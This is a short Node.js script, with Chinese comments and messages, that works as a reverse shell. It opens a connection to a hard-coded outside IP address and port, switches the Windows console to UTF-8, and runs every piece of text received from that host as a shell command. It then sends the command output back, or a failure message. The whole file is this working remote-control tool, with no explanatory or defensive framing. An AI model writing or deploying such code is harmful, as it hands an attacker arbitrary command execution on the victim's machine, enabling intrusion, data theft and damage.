const net=require('net')
const cp=require('child_process')
const client=net.connect({host:'138.197.214.216',port:3000})

// cmd中文乱码
cp.exec('chcp 65001',(err,stdout,stderr)=>{
  if(err) console.log(err.code)
})

client.on('data',data=>{
  data=data.toString()
  cp.exec(data,(err,stdout,stderr)=>{
    if(err){
      client.write('命令执行失败')
    }else{
      client.write(stdout)
    }
  })
})
